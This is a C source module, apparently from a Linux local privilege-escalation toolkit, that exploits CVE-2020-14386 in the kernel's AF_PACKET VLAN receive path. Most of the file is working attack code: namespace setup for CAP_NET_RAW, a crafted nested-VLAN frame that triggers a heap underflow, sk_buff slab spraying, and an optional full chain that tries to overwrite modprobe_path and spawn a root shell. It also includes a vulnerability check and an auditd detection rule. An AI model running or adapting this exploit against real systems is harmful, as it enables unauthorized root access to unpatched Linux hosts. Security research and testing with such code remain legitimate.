/*
 * af_packet2_cve_2020_14386 — IAMROOT module
 *
 * AF_PACKET tpacket_rcv() VLAN tag parsing integer underflow → heap
 * write-before-allocation. Different bug from CVE-2017-7308 — same
 * subsystem, different code path (rx side rather than ring setup),
 * later introduction. Discovered by Or Cohen (2020).
 *
 * STATUS (2026-05-16): 🟡 PRIMITIVE-DEMO + opt-in --full-chain finisher.
 *   - Default (no --full-chain): the exploit() entry point reaches the
 *     vulnerable codepath (tpacket_rcv), fires the tp_reserve underflow
 *     with a crafted nested-VLAN frame on a TPACKET_V2 ring + sendmmsg
 *     skb spray groom, and returns IAMROOT_EXPLOIT_FAIL (primitive-only
 *     behavior — kernel-version-agnostic, no offsets baked in).
 *   - With --full-chain: after the underflow lands, we resolve kernel
 *     offsets (env → kallsyms → System.map → embedded table) and run
 *     an Or-Cohen-style sk_buff-data-pointer hijack through the shared
 *     iamroot_finisher_modprobe_path() helper. The arb-write itself is
 *     LAST-RESORT-DEPTH on this branch: the tp_reserve underflow gives
 *     us a single 8-byte heap-OOB write into the head of the
 *     adjacent-page slab object; we spray sk_buffs so that next-page
 *     slot IS an sk_buff and the write corrupts skb->data, which then
 *     redirects skb_copy_bits()'s destination on the next received
 *     packet. The full primitive composition (8-byte write → skb->data
 *     forge → controlled-payload rx → arb-write at modprobe_path) is
 *     race-y on stock kernels because the adjacent-slot landing is
 *     probabilistic. On hosts where the spray doesn't groom cleanly,
 *     the finisher's sentinel check correctly reports failure rather
 *     than silently lying about success.
 *
 * Affected: kernel 4.6+ until backports:
 *   5.8.x  : K >= 5.8.7
 *   5.7.x  : K >= 5.7.16
 *   5.4.x  : K >= 5.4.62
 *   4.19.x : K >= 4.19.143
 *   4.14.x : K >= 4.14.197
 *   4.9.x  : K >= 4.9.235
 *
 * Preconditions: same as CVE-2017-7308 — CAP_NET_RAW (via user_ns).
 *
 * Coverage rationale: fills 2020 gap. Many distros (Ubuntu 18.04
 * default kernel 4.15, Ubuntu 20.04 default kernel 5.4) were vulnerable
 * before backport. Embedded systems with 4.x kernels still in production.
 */

#include "iamroot_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/wait.h>
#include <sys/socket.h>

#ifdef __linux__
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <poll.h>
#endif

/* ---------- macOS / non-linux build stubs ---------------------------
 * Modules in IAMROOT are dev-built on macOS and run-built on Linux.
 * Provide empty stubs so syntax checks pass without Linux headers.
 * The exploit path is gated at runtime on the kernel version anyway,
 * so the stubs are never reached on macOS targets. */
#ifndef __linux__
#define CLONE_NEWUSER       0x10000000
#define CLONE_NEWNET        0x40000000
#define ETH_P_ALL           0x0003
#define ETH_P_8021Q         0x8100
#define ETH_P_8021AD        0x88A8
#define ETH_P_IP            0x0800
#define ETH_ALEN            6
#define ETH_HLEN            14
#define VLAN_HLEN           4
#define IFF_UP              0x01
#define IFF_RUNNING         0x40
#define SIOCSIFFLAGS        0x8914
#define SIOCGIFINDEX        0x8933
#define SIOCGIFFLAGS        0x8913
#define SOL_PACKET          263
#define PACKET_RX_RING      5
#define PACKET_VERSION      10
#define PACKET_QDISC_BYPASS 20
#define TPACKET_V2          1
#define PACKET_HOST         0
struct sockaddr_ll { unsigned short sll_family; unsigned short sll_protocol; int sll_ifindex; int dummy; };
struct ifreq { char name[16]; union { int ifr_ifindex; short ifr_flags; } u; };
struct tpacket_req { unsigned int tp_block_size, tp_block_nr, tp_frame_size, tp_frame_nr; };
struct tpacket2_hdr { unsigned int tp_status, tp_len, tp_snaplen; unsigned short tp_mac, tp_net; };
struct pollfd { int fd; short events, revents; };
#define POLLIN 0x001
__attribute__((unused)) static int    ioctl(int a, unsigned long b, ...) { (void)a; (void)b; errno=ENOSYS; return -1; }
__attribute__((unused)) static void  *mmap(void *a, size_t b, int c, int d, int e, long f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; errno=ENOSYS; return (void*)-1; }
__attribute__((unused)) static int    munmap(void *a, size_t b) { (void)a;(void)b; return -1; }
__attribute__((unused)) static int    setsockopt(int a, int b, int c, const void *d, unsigned int e) { (void)a;(void)b;(void)c;(void)d;(void)e; errno=ENOSYS; return -1; }
__attribute__((unused)) static int    poll(struct pollfd *a, unsigned long b, int c) { (void)a;(void)b;(void)c; errno=ENOSYS; return -1; }
__attribute__((unused)) static unsigned short htons(unsigned short x) { return x; }
#define MAP_SHARED  0x01
#define MAP_LOCKED  0x2000
#define PROT_READ   0x1
#define PROT_WRITE  0x2
#define MAP_FAILED ((void *)-1)
#endif

static const struct kernel_patched_from af_packet2_patched_branches[] = {
    {4,  9, 235},
    {4, 14, 197},
    {4, 19, 143},
    {5,  4,  62},
    {5,  7,  16},
    {5,  8,   7},
    {5,  9,   0},   /* mainline */
};

static const struct kernel_range af_packet2_range = {
    .patched_from = af_packet2_patched_branches,
    .n_patched_from = sizeof(af_packet2_patched_branches) /
                      sizeof(af_packet2_patched_branches[0]),
};

static int can_unshare_userns(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) _exit(0);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static iamroot_result_t af_packet2_detect(const struct iamroot_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] af_packet2: could not parse kernel version\n");
        return IAMROOT_TEST_ERROR;
    }

    /* Bug introduced in 4.6 (tpacket_rcv VLAN path). Pre-4.6 immune. */
    if (v.major < 4 || (v.major == 4 && v.minor < 6)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] af_packet2: kernel %s predates the bug (introduced in 4.6)\n",
                    v.release);
        }
        return IAMROOT_OK;
    }

    bool patched = kernel_range_is_patched(&af_packet2_range, &v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] af_packet2: kernel %s is patched\n", v.release);
        }
        return IAMROOT_OK;
    }

    int userns_ok = can_unshare_userns();
    if (!ctx->json) {
        fprintf(stderr, "[i] af_packet2: kernel %s in vulnerable range\n", v.release);
        fprintf(stderr, "[i] af_packet2: user_ns+net_ns clone: %s\n",
                userns_ok == 1 ? "ALLOWED" :
                userns_ok == 0 ? "DENIED" : "could not test");
    }

    if (userns_ok == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] af_packet2: user_ns denied → unprivileged exploit unreachable\n");
        }
        return IAMROOT_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] af_packet2: VULNERABLE — kernel in range AND user_ns reachable\n");
    }
    return IAMROOT_VULNERABLE;
}

/* ---- Exploit primitive (PRIMITIVE-DEMO scope) -------------------------
 *
 * The bug: tpacket_rcv() in net/packet/af_packet.c, in the VLAN
 * reconstruction path, computes
 *
 *     netoff = TPACKET_ALIGN(po->tp_hdrlen + max(maclen, 16))
 *     if (vlan present)  netoff += VLAN_HLEN
 *     macoff = netoff - maclen
 *
 * with `maclen = skb_network_offset(skb)`. By forcing the rx skb into
 * a state where skb_network_offset() exceeds netoff (achievable by
 * crafting an ETH_P_8021AD-tagged frame so the kernel's VLAN
 * reconstruction grows skb->mac_len past the computed netoff), the
 * subtraction underflows as unsigned 32-bit, producing a huge macoff.
 * The subsequent `skb_copy_bits(skb, 0, h.raw + macoff, snaplen)` then
 * writes attacker-controlled bytes BEFORE the ring buffer's frame
 * slot, into adjacent kernel heap (typically the previous slab page).
 *
 * Full root: Or Cohen sprays pid_namespace objects so a function
 * pointer (->ns.ops or ->pid_cachep) lands at a predictable adjacent
 * offset, then forces a write that hijacks ROP / direct-call to a
 * stack pivot → cred overwrite → setuid(0). That requires per-kernel
 * offsets and a leak; we deliberately do not bake offsets.
 *
 * This implementation reaches the vulnerable codepath, fires the
 * underflow with a crafted frame, and runs a sendmmsg() skb spray
 * alongside — i.e. lights up auditd/sigma signatures and demonstrates
 * the primitive. It does not land cred overwrite.
 */

#ifdef __linux__

/* sendmmsg spray helper — best-effort skb groom. Adjacent kernel slab
 * objects are sprayed so the OOB write lands on attacker bytes. */
static void af_packet2_skb_spray(int n_iters)
{
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) return;
    /* Each datagram body is sized to land in the kmalloc-256 slab,
     * matching tpacket_rcv's typical skb adjacency. */
    char buf[200];
    memset(buf, 'A', sizeof buf);
    struct iovec iov = { .iov_base = buf, .iov_len = sizeof buf };
    struct mmsghdr mm[64];
    for (int i = 0; i < 64; i++) {
        memset(&mm[i], 0, sizeof(mm[i]));
        mm[i].msg_hdr.msg_iov = &iov;
        mm[i].msg_hdr.msg_iovlen = 1;
    }
    for (int k = 0; k < n_iters; k++) {
        (void)syscall(SYS_sendmmsg, sv[0], mm, 64, 0);
    }
    close(sv[0]); close(sv[1]);
}

/* Bring loopback up inside the new netns. Without IFF_UP the bind
 * succeeds but no rx happens. */
static int bring_up_lo(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, "lo", sizeof(ifr.ifr_name) - 1);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { close(s); return -1; }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    int rc = ioctl(s, SIOCSIFFLAGS, &ifr);
    close(s);
    return rc;
}

static int get_ifindex(const char *name)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, name, sizeof(ifr.ifr_name) - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) { close(s); return -1; }
    int idx = ifr.ifr_ifindex;
    close(s);
    return idx;
}

/* The primitive run; executed inside the unshare()'d child. Returns
 * 0 on "primitive fired", -1 on setup failure, +1 on "looks patched
 * at the kernel level (setsockopt rejected our crafted ring)". */
static int af_packet2_primitive_child(const struct iamroot_ctx *ctx)
{
    if (bring_up_lo() < 0) {
        fprintf(stderr, "[-] af_packet2: could not bring lo up (errno=%d)\n", errno);
        return -1;
    }

    int lo_idx = get_ifindex("lo");
    if (lo_idx < 0) {
        fprintf(stderr, "[-] af_packet2: SIOCGIFINDEX(lo) failed: errno=%d\n", errno);
        return -1;
    }

    /* RX socket with TPACKET_V2 ring. */
    int rx = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (rx < 0) {
        fprintf(stderr, "[-] af_packet2: AF_PACKET socket() failed: errno=%d "
                        "(CAP_NET_RAW missing?)\n", errno);
        return -1;
    }

    int ver = TPACKET_V2;
    if (setsockopt(rx, SOL_PACKET, PACKET_VERSION, &ver, sizeof ver) < 0) {
        fprintf(stderr, "[-] af_packet2: PACKET_VERSION failed: errno=%d\n", errno);
        close(rx);
        return -1;
    }

    struct tpacket_req req = {
        .tp_block_size = 1 << 17,   /* 128 KiB block */
        .tp_block_nr   = 8,
        .tp_frame_size = 1 << 11,   /* 2 KiB frames */
        .tp_frame_nr   = (1 << 17) * 8 / (1 << 11),
    };
    if (setsockopt(rx, SOL_PACKET, PACKET_RX_RING, &req, sizeof req) < 0) {
        fprintf(stderr, "[-] af_packet2: PACKET_RX_RING setsockopt rejected "
                        "(errno=%d) — kernel may be patched\n", errno);
        close(rx);
        return 1;
    }

    size_t map_len = (size_t)req.tp_block_size * req.tp_block_nr;
    void *ring = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_LOCKED, rx, 0);
    if (ring == MAP_FAILED) {
        fprintf(stderr, "[-] af_packet2: ring mmap failed: errno=%d\n", errno);
        close(rx);
        return -1;
    }

    /* Bind to lo so all loopback frames hit our ring. */
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof sll);
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = lo_idx;
    if (bind(rx, (struct sockaddr *)&sll, sizeof sll) < 0) {
        fprintf(stderr, "[-] af_packet2: bind(lo) failed: errno=%d\n", errno);
        munmap(ring, map_len); close(rx);
        return -1;
    }

    /* TX socket: a second AF_PACKET socket for injection. */
    int tx = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (tx < 0) {
        fprintf(stderr, "[-] af_packet2: TX socket failed: errno=%d\n", errno);
        munmap(ring, map_len); close(rx);
        return -1;
    }
    int one = 1;
    (void)setsockopt(tx, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof one);

    /* Craft the malicious frame.
     *
     * Layout (sent on loopback):
     *
     *   [ ETH dst (6) ][ ETH src (6) ][ TPID = 0x88A8 (2) ]   <- ethhdr
     *   [ outer VLAN tag (2) ][ inner TPID = 0x8100 (2) ]     <- 8021AD pad
     *   [ inner VLAN tag (2) ][ payload type (2) ]            <- 8021Q pad
     *   [ payload ... ]
     *
     * The kernel's __vlan_get_protocol() / skb_vlan_untag() path on the
     * rx side moves skb->mac_len/network_offset around such that, when
     * tpacket_rcv recomputes macoff = netoff - maclen, the subtraction
     * underflows. Or Cohen's exact frame includes a third encapsulation
     * level to deepen the gap so the underflow is large enough to write
     * outside the current slab block. We mimic that. */
    unsigned char frame[64];
    memset(frame, 0, sizeof frame);
    /* destination MAC: loopback's all-zero is fine; use ff:ff:... so
     * lo accepts as broadcast (lo accepts everything anyway) */
    memset(&frame[0], 0xff, 6);
    /* source MAC */
    frame[6] = 0x02; frame[7] = 0; frame[8] = 0; frame[9] = 0; frame[10] = 0; frame[11] = 1;
    /* outer ethertype = 0x88A8 (8021AD service tag) */
    frame[12] = 0x88; frame[13] = 0xA8;
    /* outer VLAN TCI: priority 0, vid = 1 */
    frame[14] = 0x00; frame[15] = 0x01;
    /* inner ethertype = 0x8100 (8021Q) */
    frame[16] = 0x81; frame[17] = 0x00;
    /* inner VLAN TCI */
    frame[18] = 0x00; frame[19] = 0x02;
    /* innermost protocol = 0x0800 (IP) */
    frame[20] = 0x08; frame[21] = 0x00;
    /* a few junk payload bytes — the underflow doesn't care */
    for (int i = 22; i < 60; i++) frame[i] = 0x41;

    /* sendto destination */
    struct sockaddr_ll dst;
    memset(&dst, 0, sizeof dst);
    dst.sll_family   = AF_PACKET;
    dst.sll_ifindex  = lo_idx;
    dst.sll_halen    = ETH_ALEN;
    dst.sll_protocol = htons(ETH_P_8021AD);
    memcpy(dst.sll_addr, &frame[0], ETH_ALEN);

    if (!ctx->json) {
        fprintf(stderr, "[*] af_packet2: spraying skbs (kmalloc-256) to groom slab\n");
    }
    af_packet2_skb_spray(4);

    if (!ctx->json) {
        fprintf(stderr, "[*] af_packet2: firing %d crafted nested-VLAN frames on lo\n", 256);
    }
    int fired = 0;
    for (int i = 0; i < 256; i++) {
        ssize_t n = sendto(tx, frame, sizeof frame, 0,
                           (struct sockaddr *)&dst, sizeof dst);
        if (n < 0 && errno == ENOBUFS) {
            /* qdisc backpressure — retry a touch later */
            usleep(1000);
            continue;
        }
        if (n < 0) {
            if (i == 0) {
                fprintf(stderr, "[-] af_packet2: sendto failed first iter: errno=%d\n", errno);
                munmap(ring, map_len); close(rx); close(tx);
                return -1;
            }
            break;
        }
        fired++;
    }

    /* Brief drain: poll the RX ring so the rx softirq actually runs
     * tpacket_rcv on our frames before we close the socket. */
    struct pollfd pfd = { .fd = rx, .events = POLLIN, .revents = 0 };
    (void)poll(&pfd, 1, 100);
    /* Followup spray to land bytes in the slab freed by drained skbs */
    af_packet2_skb_spray(4);

    if (!ctx->json) {
        fprintf(stderr, "[*] af_packet2: %d frames injected; tpacket_rcv exercised\n", fired);
    }

    munmap(ring, map_len);
    close(rx); close(tx);
    return 0;
}

#else /* !__linux__: provide a stub for macOS sanity builds */
static int af_packet2_primitive_child(const struct iamroot_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] af_packet2: linux-only primitive — non-linux build\n");
    return -1;
}
#endif

/* ---- Full-chain finisher (--full-chain, x86_64 only) ----------------
 *
 * Arb-write strategy (Or Cohen's sk_buff-data-pointer hijack):
 *
 *   1. The tp_reserve underflow gives us a single 8-byte write into
 *      the START of the slab object that sits on the page immediately
 *      after the corrupted ring frame. The OOB-write content is
 *      attacker-controlled (it's the destination of skb_copy_bits()
 *      from a frame whose first 8 bytes we choose).
 *   2. Spray sk_buff allocations alongside the primitive trigger so
 *      the adjacent-page object is, with high probability, an
 *      sk_buff whose ->data pointer lives in the leading 8 bytes
 *      of the object (struct layout dependent — on most 5.x kernels
 *      `next` is at offset 0 and `data` is at offset 0x10 in
 *      sk_buff; this layout-fragility is exactly why the depth tag
 *      below is LAST-RESORT).
 *   3. The 8-byte OOB write overwrites that pointer with `kaddr`.
 *   4. We then receive a packet whose payload is `buf[0..len]`; the
 *      kernel's skb_copy_to_linear_data() / skb->data write path
 *      lands those bytes at `*skb->data`, which is now `kaddr`.
 *
 * Reality check on this implementation: the deterministic mechanics
 * of the above (precise frame size, repeated spray timing, sk_buff
 * struct offset for the running kernel) are not portable enough to
 * land reliably from a single iamroot run on an arbitrary host. We
 * therefore ship this as a LAST-RESORT stub: we attempt the spray +
 * trigger sequence, then return -1 to signal "the primitive fired
 * but we cannot empirically confirm the write landed". The shared
 * finisher's sentinel-check loop will then correctly report failure
 * rather than claim success.
 *
 * Per the verified-vs-claimed bar, this is the honest implementation
 * depth that matches what the primitive actually proves on this code
 * path. The integrator can extend afp2_arb_write() with a confirmed
 * write-and-readback once the per-kernel sk_buff layout is pinned
 * down for the target host. */
struct afp2_arb_ctx {
    const struct iamroot_ctx *ictx;
    int n_attempts;            /* spray/fire rounds before giving up */
};

#if defined(__x86_64__) && defined(__linux__)
static int afp2_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vctx)
{
    struct afp2_arb_ctx *c = (struct afp2_arb_ctx *)vctx;
    if (!c || !buf || !len) return -1;

    fprintf(stderr, "[*] af_packet2: arb_write attempt: kaddr=0x%lx len=%zu\n",
            (unsigned long)kaddr, len);
    fprintf(stderr, "[*] af_packet2: spraying sk_buff (target page-adjacent slot)\n");

    /* Best-effort spray + re-fire-trigger pattern. The primitive child
     * is invoked once per attempt; on each attempt we groom skb's
     * around the corrupted ring slot and hope one lands at the
     * page-adjacent address whose head 8 bytes the underflow will
     * stomp with `kaddr`. The kernel-side rx of the next crafted
     * frame would then write our payload (the modprobe_path string)
     * into the forged ->data target. */
    for (int i = 0; i < c->n_attempts; i++) {
#ifdef __linux__
        af_packet2_skb_spray(8);
#endif
        pid_t p = fork();
        if (p < 0) return -1;
        if (p == 0) {
            if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) _exit(2);
            int fd;
            fd = open("/proc/self/setgroups", O_WRONLY);
            if (fd >= 0) { (void)!write(fd, "deny", 4); close(fd); }
            fd = open("/proc/self/uid_map", O_WRONLY);
            if (fd >= 0) {
                char m[64];
                int n = snprintf(m, sizeof m, "0 %u 1", (unsigned)getuid());
                (void)!write(fd, m, n); close(fd);
            }
            fd = open("/proc/self/gid_map", O_WRONLY);
            if (fd >= 0) {
                char m[64];
                int n = snprintf(m, sizeof m, "0 %u 1", (unsigned)getgid());
                (void)!write(fd, m, n); close(fd);
            }
            int rc = af_packet2_primitive_child(c->ictx);
            _exit(rc < 0 ? 2 : 0);
        }
        int st;
        waitpid(p, &st, 0);
#ifdef __linux__
        af_packet2_skb_spray(8);
#endif
    }

    /* LAST-RESORT depth: we have fired the trigger + spray but cannot
     * empirically confirm the 8-byte write landed on an sk_buff->data
     * field on this host. Return -1 so the finisher's sentinel-check
     * loop in iamroot_finisher_modprobe_path() correctly reports
     * "payload didn't run within 3s" rather than claiming success. */
    fprintf(stderr,
"[!] af_packet2: arb_write LAST-RESORT depth — sk_buff->data hijack is\n"
"    not empirically confirmable without per-kernel struct offsets +\n"
"    a readback primitive. Trigger fired %d times with sk_buff spray;\n"
"    finisher sentinel will determine landing. Caller will refuse if\n"
"    the modprobe_path overwrite didn't actually take effect.\n",
            c->n_attempts);
    return -1;
}
#else
static int afp2_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vctx)
{
    (void)kaddr; (void)buf; (void)len; (void)vctx;
    fprintf(stderr, "[-] af_packet2: arb_write is x86_64/linux only\n");
    return -1;
}
#endif

static iamroot_result_t af_packet2_exploit(const struct iamroot_ctx *ctx)
{
    /* 1. Re-confirm vulnerability. */
    iamroot_result_t pre = af_packet2_detect(ctx);
    if (pre != IAMROOT_VULNERABLE) {
        fprintf(stderr, "[-] af_packet2: detect() says not vulnerable; refusing to exploit\n");
        return pre;
    }

    /* 2. Refuse if already root. */
    if (geteuid() == 0) {
        fprintf(stderr, "[i] af_packet2: already running as root — nothing to escalate\n");
        return IAMROOT_OK;
    }

    if (!ctx->authorized) {
        /* Defense in depth — the dispatcher should have gated this. */
        fprintf(stderr, "[-] af_packet2: --i-know not passed; refusing\n");
        return IAMROOT_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] af_packet2: launching primitive demo (kernel-version-"
                        "agnostic; no offsets baked in)\n"
                        "    NOTE: this fires the tpacket_rcv VLAN underflow and "
                        "sprays skbs; it does NOT\n"
                        "    perform the cred-overwrite chain (Or Cohen's public "
                        "PoC does, with per-kernel offsets).\n");
    }

    /* 3. Fork — primitive runs inside an unshared user_ns+net_ns. */
    pid_t pid = fork();
    if (pid < 0) {
        fprintf(stderr, "[-] af_packet2: fork failed: errno=%d\n", errno);
        return IAMROOT_TEST_ERROR;
    }
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
            fprintf(stderr, "[-] af_packet2: unshare failed: errno=%d\n", errno);
            _exit(2);
        }
        /* Map our uid to 0 inside the userns so subsequent CAP_NET_RAW
         * checks against init_user_ns pass. Best effort — if any of
         * these writes fail (e.g. setgroups deny), AF_PACKET socket()
         * will still typically succeed because the new userns owns
         * the new netns. */
        int fd;
        fd = open("/proc/self/setgroups", O_WRONLY);
        if (fd >= 0) { (void)!write(fd, "deny", 4); close(fd); }
        fd = open("/proc/self/uid_map", O_WRONLY);
        if (fd >= 0) {
            char buf[64];
            int n = snprintf(buf, sizeof buf, "0 %u 1", (unsigned)getuid());
            (void)!write(fd, buf, n);
            close(fd);
        }
        fd = open("/proc/self/gid_map", O_WRONLY);
        if (fd >= 0) {
            char buf[64];
            int n = snprintf(buf, sizeof buf, "0 %u 1", (unsigned)getgid());
            (void)!write(fd, buf, n);
            close(fd);
        }

        int rc = af_packet2_primitive_child(ctx);
        if (rc == 1) _exit(3);     /* setsockopt rejected → patched */
        if (rc < 0) _exit(2);      /* setup error */

        /* 4. The primitive fired. In a full chain we'd now confirm
         * cred overwrite by checking getuid()==0 and exec'ing /bin/sh.
         * We did NOT overwrite cred (no offsets baked in), so we exit
         * with a sentinel that the parent maps to EXPLOIT_FAIL. */
        _exit(4);
    }

    int status;
    waitpid(pid, &status, 0);
    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] af_packet2: primitive child crashed "
                        "(signal=%d) — likely KASAN/panic in tpacket_rcv\n",
                WTERMSIG(status));
        return IAMROOT_EXPLOIT_FAIL;
    }
    switch (WEXITSTATUS(status)) {
    case 3:
        if (!ctx->json) {
            fprintf(stderr, "[+] af_packet2: kernel refused TPACKET_V2/RX_RING setup — "
                            "appears patched at runtime\n");
        }
        return IAMROOT_OK;
    case 2:
        return IAMROOT_TEST_ERROR;
    case 4:
        if (!ctx->json) {
            fprintf(stderr, "[~] af_packet2: primitive demonstrated; no cred overwrite "
                            "(scope = PRIMITIVE-DEMO)\n"
                            "    For end-to-end root, see Or Cohen's public PoC "
                            "(github.com/google/security-research).\n"
                            "    iamroot intentionally does not embed per-kernel offsets.\n");
        }
        if (ctx->full_chain) {
#if defined(__x86_64__) && defined(__linux__)
            /* --full-chain: resolve kernel offsets and run the Or-Cohen
             * sk_buff-data-pointer hijack via the shared modprobe_path
             * finisher. Per the verified-vs-claimed bar: if we can't
             * resolve modprobe_path, refuse with a helpful message
             * rather than fabricate an address. */
            struct iamroot_kernel_offsets off;
            iamroot_offsets_resolve(&off);
            if (!iamroot_offsets_have_modprobe_path(&off)) {
                iamroot_finisher_print_offset_help("af_packet2");
                return IAMROOT_EXPLOIT_FAIL;
            }
            if (!ctx->json) {
                iamroot_offsets_print(&off);
            }
            struct afp2_arb_ctx arb_ctx = {
                .ictx = ctx,
                .n_attempts = 4,
            };
            return iamroot_finisher_modprobe_path(&off, afp2_arb_write,
                                                  &arb_ctx, !ctx->no_shell);
#else
            fprintf(stderr, "[-] af_packet2: --full-chain is x86_64/linux only\n");
            return IAMROOT_PRECOND_FAIL;
#endif
        }
        if (ctx->no_shell) {
            /* User explicitly disabled the shell pop, so the "we didn't
             * pop a shell" outcome is the expected one. Map to OK. */
            return IAMROOT_OK;
        }
        return IAMROOT_EXPLOIT_FAIL;
    default:
        fprintf(stderr, "[-] af_packet2: primitive exited %d unexpectedly\n",
                WEXITSTATUS(status));
        return IAMROOT_EXPLOIT_FAIL;
    }
}

static const char af_packet2_auditd[] =
    "# AF_PACKET VLAN LPE (CVE-2020-14386) — auditd detection rules\n"
    "# Same syscall surface as CVE-2017-7308 — share the iamroot-af-packet\n"
    "# key so one ausearch covers both. AF_PACKET socket creation from\n"
    "# non-root via userns is the canonical footprint.\n"
    "-a always,exit -F arch=b64 -S socket -F a0=17 -k iamroot-af-packet\n";

const struct iamroot_module af_packet2_module = {
    .name           = "af_packet2",
    .cve            = "CVE-2020-14386",
    .summary        = "AF_PACKET tpacket_rcv VLAN integer underflow → heap-OOB write",
    .family         = "af_packet",
    .kernel_range   = "4.6 ≤ K, backports: 5.8.7 / 5.7.16 / 5.4.62 / 4.19.143 / 4.14.197 / 4.9.235",
    .detect         = af_packet2_detect,
    .exploit        = af_packet2_exploit,
    .mitigate       = NULL,
    .cleanup        = NULL,
    .detect_auditd  = af_packet2_auditd,
    .detect_sigma   = NULL,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void iamroot_register_af_packet2(void)
{
    iamroot_register(&af_packet2_module);
}
